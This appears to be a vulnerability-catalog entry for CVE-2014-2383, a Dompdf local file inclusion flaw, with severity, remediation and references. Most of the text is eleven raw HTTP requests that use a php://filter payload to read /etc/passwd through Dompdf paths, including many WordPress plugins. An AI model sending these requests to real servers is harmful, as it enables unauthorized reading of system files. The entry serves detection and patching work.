---
layout: post
cve_id: CVE-2014-2383
title: Dompdf < v0.6.0 - Local File Inclusion
pcap: true
pcap_path: /pcaps/2014/CVE-2014-2383.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2014/CVE-2014-2383.yaml
snort2_rule: N/A
snort3_rule: N/A
author: 0x_Akoko,akincibor,ritikchaddha
severity: medium
impact: 'The vulnerability can lead to unauthorized access to sensitive files, remote
  code execution, and compromise of the affected system.

  '
remediation: 'Upgrade Dompdf to a version higher than v0.6.0 to mitigate the vulnerability.

  '
reference:
- https://www.exploit-db.com/exploits/33004
- http://seclists.org/fulldisclosure/2014/Apr/258
- https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2383/
- https://wpscan.com/vulnerability/1d64d0cb-6b71-47bb-8807-7c8350922582
- https://nvd.nist.gov/vuln/detail/CVE-2014-2383
classification:
  cvss-metrics: CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P
  cvss-score: 6.8
  cve-id: CVE-2014-2383
  cwe-id: CWE-200
  epss-score: 0.44813
  epss-percentile: 0.9746
  cpe: cpe:2.3:a:dompdf:dompdf:*:beta3:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 11
  vendor: dompdf
  product: dompdf
tags:
- cve2014
- cve
- lfi
- wp-plugin
- wpscan
- dompdf
- wordpress
- wp
- edb
- seclists
- vkev
- vuln
---

## ðŸ” Vulnerability Description
A vulnerability in dompdf.php in dompdf before 0.6.1, when DOMPDF_ENABLE_PHP is enabled, allows context-dependent attackers to bypass chroot protections and read arbitrary files via a PHP protocol and wrappers in the input_file parameter, as demonstrated by a php://filter/read=convert.base64-encode/resource in the input_file parameter.


## ðŸŒ HTTP Request
```nohighlight
GET /includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /PhpSpreadsheet/Writer/PDF/DomPDF.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /dompdf.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/125.5.6 (KHTML, like Gecko) Safari/125.12
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /wp-content/plugins/web-portal-lite-client-portal-secure-file-sharing-private-messaging/includes/libs/pdf/dompdf.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /wp-content/plugins/wp-ecommerce-shop-styling/includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /wp-content/plugins/abstract-submission/dompdf-0.5.1/dompdf.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/604.1
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /wp-content/plugins/buddypress-component-stats/lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /wp-content/plugins/post-pdf-export/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /wp-content/plugins/gboutique/library/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /wp-content/plugins/blogtopdf/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
Connection: close
```

